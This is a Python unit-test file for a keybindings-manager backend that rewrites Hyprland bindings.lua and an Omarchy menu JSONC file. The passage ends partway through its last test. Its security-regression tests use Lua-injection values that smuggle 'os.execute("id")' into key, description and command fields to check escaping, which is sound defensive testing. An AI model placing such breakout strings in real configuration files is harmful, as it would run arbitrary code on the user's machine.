#!/usr/bin/env python3
import unittest
import os
import sys
import tempfile
import threading
import json
import shutil
import pathlib

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "backend")))
import keybinds_manager


class TestKeybindsBackend(unittest.TestCase):

    def test_normalize_key_chord(self):
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + A"), "SUPER + A")
        self.assertEqual(keybinds_manager.normalize_key_chord("CTRL + ALT + DELETE"), "CTRL + ALT + DELETE")
        self.assertEqual(keybinds_manager.normalize_key_chord("ctrl+a"), "CTRL + A")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER+SHIFT+RETURN"), "SUPER + SHIFT + RETURN")
        self.assertEqual(keybinds_manager.normalize_key_chord("SHIFT+SUPER+ctrl+w"), "SUPER + SHIFT + CTRL + W")
        self.assertEqual(keybinds_manager.normalize_key_chord("XF86AudioMute"), "XF86AudioMute")

    def test_parse_default_bindings(self):
        binds = keybinds_manager.parse_default_bindings()
        self.assertGreater(len(binds), 20)
        keys = [b["key"] for b in binds]
        self.assertIn("SUPER + RETURN", keys)
        self.assertIn("SUPER + SPACE", keys)

    def test_skip_comments_in_user_bindings(self):
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            # Write commented out lines
            with open(tmp_path, "w") as f:
                f.write('-- hl.unbind("SUPER + SHIFT + B")\n-- o.bind("SUPER + X", "Test", "test-cmd")\n')

            parsed = keybinds_manager.parse_user_bindings()
            self.assertNotIn("SUPER + SHIFT + B", parsed["unbinds"])
            self.assertEqual(len(parsed["binds"]), 0)

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_write_user_bindings_oversized_file_refused(self):
        # Same defect class as the menu cap (round-2 filesystem review): the
        # text-mode read(n) counted CHARACTERS, so a >64 KiB bindings file was
        # silently truncated on edit — the tail lost in BOTH the rewrite and
        # the .bak. Byte-exact cap refuses instead of destroying data.
        old_path = keybinds_manager.USER_BINDINGS_PATH
        tmp = tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua")
        tmp.close()
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp.name
            original = "-- pad\n-- " + ("a" * 70000) + "\n"   # >64 KiB bytes+chars
            with open(tmp.name, "w", encoding="utf-8") as f:
                f.write(original)
            with open(tmp.name, "rb") as f:
                raw_before = f.read()
            self.assertGreater(len(raw_before), keybinds_manager.MAX_FILE_BYTES)
            with self.assertRaises(ValueError):
                keybinds_manager.write_user_bindings(
                    lines_to_add=[{"key": "SUPER + Z", "description": "X",
                                   "command": "x"}],
                    unbinds_to_add=["SUPER + Z"])
            with open(tmp.name, "rb") as f:
                self.assertEqual(f.read(), raw_before)   # no truncating rewrite
        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp.name):
                os.unlink(tmp.name)

    def test_write_and_parse_user_bindings(self):
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            # Initial state
            with open(tmp_path, "w") as f:
                f.write('-- Header\n-- [[ OMARCHY_MOUSE_BINDINGS_START ]]\no.bind("mouse:275", "Prev", "prev_ws")\n-- [[ OMARCHY_MOUSE_BINDINGS_END ]]\n')

            # Add a binding
            keybinds_manager.write_user_bindings(
                lines_to_add=[{"key": "SUPER + SHIFT + Z", "description": "Custom Tool", "command": "my-tool"}],
                unbinds_to_add=["SUPER + SHIFT + Z"]
            )

            parsed = keybinds_manager.parse_user_bindings()
            self.assertIn("SUPER + SHIFT + Z", parsed["unbinds"])
            self.assertTrue(any(b["key"] == "SUPER + SHIFT + Z" and b["description"] == "Custom Tool" for b in parsed["binds"]))

            # Verify mouse bindings preserved
            with open(tmp_path, "r") as f:
                content = f.read()
            self.assertIn("OMARCHY_MOUSE_BINDINGS_START", content)
            self.assertIn("mouse:275", content)

            # Remove the binding
            keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + SHIFT + Z"])
            parsed_after = keybinds_manager.parse_user_bindings()
            self.assertNotIn("SUPER + SHIFT + Z", parsed_after["unbinds"])
            self.assertFalse(any(b["key"] == "SUPER + SHIFT + Z" for b in parsed_after["binds"]))

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_parse_bind_line_roundtrip(self):
        """Verify actions with nested parens/braces survive parsing."""
        cases = [
            ('o.bind("SUPER + LEFT", "Focus Left", hl.dsp.focus.left())',
             "SUPER + LEFT", "Focus Left", "hl.dsp.focus.left()"),
            ('o.bind("SUPER + SHIFT + LEFT", "Move Left", hl.dsp.window.move({ direction = "left" }))',
             "SUPER + SHIFT + LEFT", "Move Left", 'hl.dsp.window.move({ direction = "left" })'),
            ('o.bind("SUPER + T", "Toggle Float", hl.dsp.window.float({ action = "toggle" }))',
             "SUPER + T", "Toggle Float", 'hl.dsp.window.float({ action = "toggle" })'),
            ('o.bind("SUPER + J", "Toggle Split", hl.dsp.layout("togglesplit"))',
             "SUPER + J", "Toggle Split", 'hl.dsp.layout("togglesplit")'),
            ('o.bind("SUPER + TAB", "Next WS", hl.dsp.focus({ workspace = "e+1" }))',
             "SUPER + TAB", "Next WS", 'hl.dsp.focus({ workspace = "e+1" })'),
            ('o.bind("SUPER + S", "Scratch", hl.dsp.special_workspace.focus({ name = "scratchpad" }))',
             "SUPER + S", "Scratch", 'hl.dsp.special_workspace.focus({ name = "scratchpad" })'),
            ('o.bind_toggle("SUPER + F5", "Toggle Bar", hl.dsp.bar.toggle())',
             "SUPER + F5", "Toggle Bar", "hl.dsp.bar.toggle()"),
            ('o.bind("SUPER + K", "Menu", "exec")',
             "SUPER + K", "Menu", '"exec"'),
        ]
        for line, exp_key, exp_desc, exp_action in cases:
            result = keybinds_manager._parse_bind_line(line)
            self.assertIsNotNone(result, f"Failed to parse: {line}")
            key, desc, action, opts = result
            self.assertEqual(key, exp_key, f"Key mismatch for: {line}")
            self.assertEqual(desc, exp_desc, f"Desc mismatch for: {line}")
            self.assertEqual(action, exp_action, f"Action mismatch for: {line}")

    def test_write_and_reparse_preserves_parens(self):
        """Write catalog dispatchers to file, reparse, verify actions intact."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        try:
            old_path = keybinds_manager.USER_BINDINGS_PATH
            keybinds_manager.USER_BINDINGS_PATH = tmp_path

            with open(tmp_path, "w") as f:
                f.write('')

            dispatchers = [
                ("SUPER + W", "Close", "hl.dsp.window.close()"),
                ("SUPER + F", "Fullscreen", "hl.dsp.window.fullscreen()"),
                ("SUPER + ALT + F", "Full Width", "hl.dsp.window.fullwidth()"),
                ("SUPER + T", "Float", 'hl.dsp.window.float({ action = "toggle" })'),
                ("SUPER + J", "Split", 'hl.dsp.layout("togglesplit")'),
                ("SUPER + LEFT", "Focus L", "hl.dsp.focus.left()"),
                ("SUPER + SHIFT + LEFT", "Move L", 'hl.dsp.window.move({ direction = "left" })'),
                ("SUPER + TAB", "Next WS", 'hl.dsp.focus({ workspace = "e+1" })'),
                ("SUPER + S", "Scratch", 'hl.dsp.special_workspace.focus({ name = "scratchpad" })'),
                ("SUPER + ALT + S", "Move to Scratch", 'hl.dsp.special_workspace.move_window({ name = "scratchpad" })'),
            ]

            binds = [{"key": k, "description": d, "command": "", "action": a} for k, d, a in dispatchers]
            keybinds_manager.write_user_bindings(
                lines_to_add=binds,
                unbinds_to_add=[k for k, _, _ in dispatchers]
            )

            parsed = keybinds_manager.parse_user_bindings()
            self.assertEqual(len(parsed["binds"]), len(dispatchers))

            for i, (k, d, a) in enumerate(dispatchers):
                self.assertEqual(parsed["binds"][i]["action"], a,
                    f"Action mismatch for {k}: got {parsed['binds'][i]['action']!r}")

        finally:
            keybinds_manager.USER_BINDINGS_PATH = old_path
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_swap_two_keybindings_preserves_first(self):
        """Swapping two bindings' keys must keep the first binding's freshly written line.
        Regression for issue #11 -- the second edit's old_key equals the key the first
        edit just bound to, and key-only removal was dropping it as collateral."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        orig_defaults = keybinds_manager.parse_default_bindings
        orig_reload = keybinds_manager.reload_hyprland
        orig_path = keybinds_manager.USER_BINDINGS_PATH
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp_path
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + F", "description": "Full screen",
                 "action": 'hl.dsp.window.fullscreen({ mode = "fullscreen" })'},
                {"key": "SUPER + ALT + F", "description": "Full width",
                 "action": 'hl.dsp.window.fullscreen({ mode = "maximized" })'},
            ]
            keybinds_manager.reload_hyprland = lambda: {"success": True, "reload_output": "", "config_errors": ""}

            with open(tmp_path, "w") as f:
                f.write("")

            # Step 2: move "Full screen" SUPER + F -> SUPER + ALT + F
            keybinds_manager.set_keybinding(
                key="SUPER + ALT + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "fullscreen" })', old_key="SUPER + F",
                old_description="Full screen",
                old_action='hl.dsp.window.fullscreen({ mode = "fullscreen" })')
            # Step 3: move "Full width" SUPER + ALT + F -> SUPER + F (the swap)
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full width", command="",
                action='hl.dsp.window.fullscreen({ mode = "maximized" })', old_key="SUPER + ALT + F",
                old_description="Full width",
                old_action='hl.dsp.window.fullscreen({ mode = "maximized" })')

            with open(tmp_path) as f:
                content = f.read()

            self.assertIn('o.bind("SUPER + ALT + F", "Full screen"', content)
            self.assertIn('mode = "fullscreen"', content)
            self.assertIn('o.bind("SUPER + F", "Full width"', content)
            self.assertIn('mode = "maximized"', content)
        finally:
            keybinds_manager.USER_BINDINGS_PATH = orig_path
            keybinds_manager.parse_default_bindings = orig_defaults
            keybinds_manager.reload_hyprland = orig_reload
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_in_place_action_edit_removes_old_line(self):
        """Editing a binding's action in place (same key, same description, new
        action) must replace the old o.bind line, not leave a stale one behind.
        Guards the preserve_entry identity match against matching on the NEW
        action, which would wrongly keep the old line."""
        with tempfile.NamedTemporaryFile("w+", delete=False, suffix=".lua") as tmp:
            tmp_path = tmp.name

        orig_defaults = keybinds_manager.parse_default_bindings
        orig_reload = keybinds_manager.reload_hyprland
        orig_path = keybinds_manager.USER_BINDINGS_PATH
        try:
            keybinds_manager.USER_BINDINGS_PATH = tmp_path
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + F", "description": "Full screen",
                 "action": 'hl.dsp.window.fullscreen({ mode = "fullscreen" })'},
            ]
            keybinds_manager.reload_hyprland = lambda: {"success": True, "reload_output": "", "config_errors": ""}

            with open(tmp_path, "w") as f:
                f.write("")

            # First write with action A
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "fullscreen" })', old_key="SUPER + F")
            # In-place edit: same key + description, new action
            keybinds_manager.set_keybinding(
                key="SUPER + F", description="Full screen", command="",
                action='hl.dsp.window.fullscreen({ mode = "maximized" })', old_key="SUPER + F")

            with open(tmp_path) as f:
                content = f.read()

            # Old action must be gone; exactly one Full screen bind, with the new action
            self.assertNotIn('mode = "fullscreen"', content)
            self.assertIn('o.bind("SUPER + F", "Full screen"', content)
            self.assertIn('mode = "maximized"', content)
            fullscreen_binds = [l for l in content.splitlines()
                                if l.strip().startswith('o.bind("SUPER + F"')]
            self.assertEqual(len(fullscreen_binds), 1)
        finally:
            keybinds_manager.USER_BINDINGS_PATH = orig_path
            keybinds_manager.parse_default_bindings = orig_defaults
            keybinds_manager.reload_hyprland = orig_reload
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            if os.path.exists(tmp_path + ".bak"):
                os.remove(tmp_path + ".bak")

    def test_write_user_bindings_preserves_symlink(self):
        """Dotfile-managed bindings.lua may be a symlink; writes must update the
        target and keep the symlink intact (PR #21 review)."""
        with tempfile.TemporaryDirectory() as td:
            target = os.path.join(td, "dotfiles", "bindings.lua")
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "w", encoding="utf-8") as f:
                f.write("-- original\n")

            link_dir = os.path.join(td, "config", "hypr")
            os.makedirs(link_dir, exist_ok=True)
            link = os.path.join(link_dir, "bindings.lua")
            os.symlink(target, link)

            old_path = keybinds_manager.USER_BINDINGS_PATH
            try:
                keybinds_manager.USER_BINDINGS_PATH = link
                keybinds_manager.write_user_bindings(
                    lines_to_add=[{"key": "SUPER + Z", "description": "Test",
                                   "command": "my-tool"}],
                    unbinds_to_add=["SUPER + Z"])

                self.assertTrue(os.path.islink(link))
                self.assertEqual(os.path.realpath(link), os.path.realpath(target))
                with open(target, "r", encoding="utf-8") as f:
                    target_content = f.read()
                self.assertIn('o.bind("SUPER + Z", "Test", "my-tool")', target_content)
                with open(link, "r", encoding="utf-8") as f:
                    link_content = f.read()
                self.assertEqual(link_content, target_content)
                self.assertTrue(os.path.isfile(target + ".bak"))
            finally:
                keybinds_manager.USER_BINDINGS_PATH = old_path

    def test_get_installed_apps(self):
        apps = keybinds_manager.get_installed_apps()
        self.assertIsInstance(apps, list)
        if apps:
            first = apps[0]
            self.assertIn("name", first)
            self.assertIn("exec", first)
            self.assertIn("icon", first)
            self.assertIn("terminal", first)
            # Verify alphabetical ordering
            names = [a["name"].lower() for a in apps]
            self.assertEqual(names, sorted(names))

    def test_expanded_catalog(self):
        catalog_ids = {p["id"] for p in keybinds_manager.PRESET_CATALOG}
        self.assertIn("ws.switch_1", catalog_ids)
        self.assertIn("ws.switch_10", catalog_ids)
        self.assertIn("ws.move_1", catalog_ids)
        self.assertIn("win.swap_left", catalog_ids)
        self.assertIn("media.play_pause", catalog_ids)
        self.assertIn("media.brightness_up", catalog_ids)

    def test_normalize_key_chord_punctuation(self):
        """Verify commas, pluses, and punctuation keys are preserved."""
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + ,"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("CTRL + +"), "CTRL + plus")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + comma"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + COMMA"), "SUPER + comma")
        self.assertEqual(keybinds_manager.normalize_key_chord("SUPER + ."), "SUPER + period")

    def test_sanitize_lua_str_max_len(self):
        """Verify sanitize_lua_str respects max_len parameter."""
        long_cmd = "echo " + ("a" * 500)
        default_sanitized = keybinds_manager.sanitize_lua_str(long_cmd)
        self.assertEqual(len(default_sanitized), keybinds_manager.MAX_TEXT_LEN)
        cmd_sanitized = keybinds_manager.sanitize_lua_str(long_cmd, max_len=keybinds_manager.MAX_CMD_LEN)
        self.assertEqual(len(cmd_sanitized), len(long_cmd))

    def test_preset_catalog_valid_dispatchers(self):
        """Verify no non-existent hierarchical function paths exist in catalog."""
        invalid_patterns = ["hl.dsp.focus.left", "hl.dsp.focus.right", "hl.dsp.focus.up", "hl.dsp.focus.down",
                            "hl.dsp.window.fullwidth", "hl.dsp.special_workspace"]
        for preset in keybinds_manager.PRESET_CATALOG:
            dsp = preset.get("dispatcher", "")
            for pat in invalid_patterns:
                self.assertNotIn(pat, dsp, f"Invalid dispatcher pattern '{pat}' in preset {preset['id']}")

    def test_new_presets_included(self):
        catalog_ids = {p["id"] for p in keybinds_manager.PRESET_CATALOG}
        self.assertIn("mon.focus_next", catalog_ids)
        self.assertIn("mon.move_ws_left", catalog_ids)
        self.assertIn("win.pin", catalog_ids)
        self.assertIn("ws.previous_history", catalog_ids)


class TestMenuEntry(unittest.TestCase):
    """Launcher-menu install/remove/check must never destroy or silently skip
    the user's omarchy-menu.jsonc (marketplace finding #13661)."""

    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        self._saved_path = keybinds_manager.MENU_CONFIG_PATH
        keybinds_manager.MENU_CONFIG_PATH = os.path.join(
            self._tmpdir.name, "omarchy-menu.jsonc")

    def tearDown(self):
        keybinds_manager.MENU_CONFIG_PATH = self._saved_path
        self._tmpdir.cleanup()

    def _write(self, content):
        with open(keybinds_manager.MENU_CONFIG_PATH, "w", encoding="utf-8") as f:
            f.write(content)

    def _read_bytes(self):
        with open(keybinds_manager.MENU_CONFIG_PATH, "rb") as f:
            return f.read()

    def _load(self):
        import json
        return json.loads(keybinds_manager._strip_jsonc_comments(
            self._read_bytes().decode("utf-8")))

    # -- the #13661 clobber -------------------------------------------------

    def test_menu_install_preserves_url_entries(self):
        self._write(
            '{\n'
            '  "other.site": {"label": "Site", "action": "https://example.com/a"},\n'
            '  "another.one": {"label": "Two", "action": "https://two.example/x"},\n'
            '  "third.one": {"label": "Three", "action": "https://three.example/y"}\n'
            '}\n')
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn("another.one", data)
        self.assertIn("third.one", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["other.site"]["action"], "https://example.com/a")

    def test_menu_install_unparseable_file_is_not_written(self):
        original = b"{{{ this is not json at all"
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        self.assertIn("error", res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_non_object_top_level_refused(self):
        original = b'["not", "an", "object"]'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()   # used to raise TypeError
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        # Pin the diagnostic, not just the failure: the broad except would
        # otherwise mask this guard (mutation sweep: "top-level must be object").
        self.assertIn("top level is not a JSON object", res["message"])
        self.assertEqual(self._read_bytes(), original)

    def test_menu_remove_unparseable_file_is_not_written(self):
        original = b"{{{ this is not json at all"
        self._write(original.decode("utf-8"))
        res = keybinds_manager.remove_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("message", res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_remove_preserves_other_entries(self):
        self._write(
            '{\n'
            '  "other.site": {"label": "Site", "action": "https://example.com/a"},\n'
            f'  "{keybinds_manager.MENU_ENTRY_KEY}": {{"label": "KM", "action": "x"}}\n'
            '}\n')
        res = keybinds_manager.remove_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertNotIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["other.site"]["action"], "https://example.com/a")

    def test_menu_check_reports_failure_on_unparseable_file(self):
        self._write("{{{ not json")
        res = keybinds_manager.check_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertFalse(res.get("exists"))
        self.assertIn("message", res)

    def test_menu_check_happy_path_reports_entry(self):
        # The success contract had no test at all (review round): present ->
        # exists True, absent -> exists False, both with success True.
        self._write('{"other.site": {"label": "Site"}}\n')
        res = keybinds_manager.check_menu_entry()
        self.assertTrue(res.get("success"), res)
        self.assertFalse(res.get("exists"))
        self._write(json.dumps({keybinds_manager.MENU_ENTRY_KEY:
                                {"label": "KM", "action": "x"}}))
        res2 = keybinds_manager.check_menu_entry()
        self.assertTrue(res2.get("success"), res2)
        self.assertTrue(res2.get("exists"))

    # -- every menu path answers JSON (no empty stdout for the QML) ---------

    def test_menu_check_symlink_returns_json_not_exception(self):
        target = os.path.join(self._tmpdir.name, "real.jsonc")
        with open(target, "w", encoding="utf-8") as f:
            f.write("{}\n")
        link = keybinds_manager.MENU_CONFIG_PATH
        os.symlink(target, link)
        res = keybinds_manager.check_menu_entry()   # must not raise
        self.assertIsInstance(res, dict)
        self.assertFalse(res.get("success"))
        self.assertFalse(res.get("exists"))
        res2 = keybinds_manager.install_menu_entry()  # must not raise either
        self.assertFalse(res2.get("success"))
        self.assertIn("message", res2)

    def test_menu_install_write_failure_returns_json(self):
        self._write('{"other.site": {"label": "Site"}}\n')
        original = self._read_bytes()
        import unittest.mock
        with unittest.mock.patch.object(
                keybinds_manager, "_safe_atomic_write_file",
                side_effect=OSError("read-only filesystem")):
            res = keybinds_manager.install_menu_entry()   # must not raise
        self.assertFalse(res.get("success"))
        self.assertIn("message", res)
        self.assertEqual(self._read_bytes(), original)

    # -- string-aware JSONC scanner ----------------------------------------

    def test_strip_preserves_urls_escapes_and_comment_quotes(self):
        src = ('{\n'
               '  // a line comment with \'quotes\' and // slashes\n'
               '  "url": "https://example.com/a//b",\n'
               '  "win": "C:\\\\dir\\\\file",\n'
               '  "notcomment": "/* stays */ and // this too" /* real block // comment */\n'
               '}\n')
        import json
        data = json.loads(keybinds_manager._strip_jsonc_comments(src))
        self.assertEqual(data["url"], "https://example.com/a//b")
        self.assertEqual(data["win"], "C:\\dir\\file")
        self.assertEqual(data["notcomment"], "/* stays */ and // this too")

    def test_strip_block_comment_containing_slashes(self):
        import json
        src = '/* a // b \n c */ {"a": 1}'
        data = json.loads(keybinds_manager._strip_jsonc_comments(src))
        self.assertEqual(data, {"a": 1})

    def test_strip_line_comment_at_eof_without_newline_is_valid(self):
        import json
        data = json.loads(keybinds_manager._strip_jsonc_comments('{"a": 1} // tail'))
        self.assertEqual(data, {"a": 1})

    def test_strip_unterminated_string_raises(self):
        with self.assertRaises(ValueError):
            keybinds_manager._strip_jsonc_comments('{"a": "oops')

    def test_strip_unterminated_block_comment_raises(self):
        with self.assertRaises(ValueError):
            keybinds_manager._strip_jsonc_comments('{"a": 1} /* oops')

    def test_menu_install_refuses_unterminated_string(self):
        original = b'{"a": "oops'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_refuses_unterminated_block_comment(self):
        original = b'{"a": 1} /* oops'
        self._write(original.decode("utf-8"))
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_realistic_jsonc_fixture(self):
        self._write(
            '{\n'
            '  // Omarchy launcher entries\n'
            f'  "{keybinds_manager.MENU_ENTRY_KEY}": {{\n'
            '    "icon": "\uf464",\n'
            '    "label": "Keybindings Manager",\n'
            '    "action": "omarchy-shell shell summon meviusisback.keybinds"\n'
            '  },\n'
            '  "web.thing": {\n'
            '    "label": "Docs",\n'
            '    "action": "https://docs.example/guide//latest"  // trailing comment\n'
            '  }\n'
            '}\n')
        res = keybinds_manager.remove_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertNotIn(keybinds_manager.MENU_ENTRY_KEY, data)
        self.assertEqual(data["web.thing"]["action"],
                         "https://docs.example/guide//latest")

    def test_menu_install_line_comment_at_eof_is_valid(self):
        self._write('{"other.site": {"label": "Site"}} // note')  # no newline
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)

    # -- size cap: refuse oversized, accept exact-fit -----------------------

    def test_menu_install_oversized_file_refused(self):
        base = '{"other.site": {"label": "Site"}}'
        pad = keybinds_manager.MAX_FILE_BYTES + 1 - len(base)
        content = base + (" " * pad)
        self.assertEqual(len(content), keybinds_manager.MAX_FILE_BYTES + 1)
        self._write(content)
        original = self._read_bytes()
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("refus", res.get("message", "").lower())
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_multibyte_oversized_refused(self):
        # 40 000 two-byte chars = ~80 000 UTF-8 bytes but only 40 012
        # CHARACTERS: a text-mode cap (pre-fix) accepted this at 4x the
        # documented 64 KiB byte limit — three reviewers flagged it.
        content = '{"pad": "' + ("é" * 40000) + '"}'
        self.assertGreater(len(content.encode("utf-8")),
                           keybinds_manager.MAX_FILE_BYTES)
        self.assertLess(len(content), keybinds_manager.MAX_FILE_BYTES)
        self._write(content)
        original = self._read_bytes()
        res = keybinds_manager.install_menu_entry()
        self.assertFalse(res.get("success"), res)
        self.assertIn("refus", res.get("message", "").lower())
        self.assertEqual(self._read_bytes(), original)

    def test_menu_install_multibyte_under_cap_accepted(self):
        self._write(json.dumps({"café.menu": {"label": "Café ☕",
                                              "action": "https://café.example/ünïcode"}}))
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("café.menu", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)

    def test_menu_install_exact_cap_file_accepted(self):
        base = '{"other.site": {"label": "Site"}}'
        pad = keybinds_manager.MAX_FILE_BYTES - len(base)
        content = base + (" " * pad)
        self.assertEqual(len(content), keybinds_manager.MAX_FILE_BYTES)
        self._write(content)
        res = keybinds_manager.install_menu_entry()
        self.assertTrue(res.get("success"), res)
        data = self._load()
        self.assertIn("other.site", data)
        self.assertIn(keybinds_manager.MENU_ENTRY_KEY, data)


class TestSecurityRegressions(unittest.TestCase):
    """2026-11 tree audit: the Lua-literal escapes, the backup safety net,
    statement-aware editing and the bounded readers were all unasserted — a
    guard-deletion sweep left the suite green while the plugin wrote unescaped
    Lua into the file Hyprland executes."""

    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        self._saved_path = keybinds_manager.USER_BINDINGS_PATH
        self.path = os.path.join(self._tmpdir.name, "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved_path
        self._tmpdir.cleanup()

    def _write(self, content):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write(content)

    def _read(self):
        with open(self.path, "r", encoding="utf-8") as f:
            return f.read()

    def _read_backup(self):
        with open(self.path + ".bak", "r", encoding="utf-8") as f:
            return f.read()

    # -- Lua literal escaping ----------------------------------------------

    def test_sanitize_lua_str_escapes_literal_breakout(self):
        self.assertEqual(keybinds_manager.sanitize_lua_str('a"b'), r'a\"b')
        self.assertEqual(keybinds_manager.sanitize_lua_str("a\\b"), r"a\\b")
        self.assertEqual(keybinds_manager.sanitize_lua_str("a\nb\rc"), "a b c")

    def test_normalize_key_chord_rejects_lua_breakout(self):
        for chord in ['SUPER + A") --', "A)os.execute(1)", 'SUPER + "',
                      "A\nB", "X" * 80]:
            self.assertEqual(keybinds_manager.normalize_key_chord(chord), "",
                             f"chord survived normalization: {chord!r}")

    def test_set_keybinding_refuses_unsafe_key_without_writing(self):
        self._write("-- original\n")
        res = keybinds_manager.set_keybinding('SUPER + A") --', "x", "y")
        self.assertFalse(res["success"])
        self.assertEqual(self._read(), "-- original\n")

    def test_write_escapes_description_breakout(self):
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + Z",
                           "description": 'x"); os.execute("id") --',
                           "command": "true"}],
            unbinds_to_add=["SUPER + Z"])
        content = self._read()
        self.assertEqual(content.count("o.bind"), 1)
        self.assertIn(
            r'o.bind("SUPER + Z", "x\"); os.execute(\"id\") --", "true")',
            content)
        reparsed = keybinds_manager.parse_user_bindings()["binds"]
        self.assertEqual(len(reparsed), 1)
        self.assertEqual(reparsed[0]["description"], 'x"); os.execute("id") --')

    def test_command_is_literal_action_is_dispatcher(self):
        # Raw Lua must come only from the explicit dispatcher field: a
        # .desktop Exec is untrusted data, and prefix-sniffing it as code let
        # `Exec=hl.…` inject statements into bindings.lua.
        self._write("-- original\n")
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + X", "description": "Exec",
                           "command": 'hl.dsp.window.close()) os.execute("id") --'}])
        self.assertIn(
            r'"hl.dsp.window.close()) os.execute(\"id\") --"', self._read())
        keybinds_manager.write_user_bindings(
            lines_to_add=[{"key": "SUPER + D", "description": "Close",
                           "command": "", "action": "hl.dsp.window.close()"}],
            keys_to_remove=["SUPER + D"])
        self.assertIn('o.bind("SUPER + D", "Close", hl.dsp.window.close())',
                      self._read())

    def test_long_bracket_action_roundtrip(self):
        # Long-string actions must keep their `[[ ]]` / `[==[ ]==]` delimiters:
        # dropping them turned the action into unquoted text on reparse.
        self._write('o.bind("SUPER + D", "D", [[raw ; ( " foo]])\n'
                    'o.bind("SUPER + L", "L", [==[raw ]] ( " bar]==])\n')
        binds = keybinds_manager.parse_user_bindings()["binds"]
        actions = {b["key"]: b["action"] for b in binds}
        self.assertEqual(actions["SUPER + D"], '[[raw ; ( " foo]]')
        self.assertEqual(actions["SUPER + L"], '[==[raw ]] ( " bar]==]')

    def test_long_string_content_is_not_a_binding(self):
        commented = '[[hl.unbind("SUPER + X")]]\n'
        self._write(commented)
        self.assertEqual(keybinds_manager.parse_user_bindings()["unbinds"], set())
        keybinds_manager.write_user_bindings(keys_to_remove=["SUPER + X"])
        self.assertIn(commented.strip(), self._read())

    def test_escaped_newline_string_does_not_swallow_following_binds(self):
        # A backslash at end of line escapes the newline, not the first
        # character of the next line; leaking that state merged the rest of
        # the file into one unit and a targeted write deleted it.
        self._write('o.bind("SUPER + X", "X", "echo hi\\\n'
                    '")\n'
                    'o.bind("SUPER + Y", "Y", "keep")\n')
        keys = [b["key"] for b in keybinds_manager.parse_user_bindings()["binds"]]
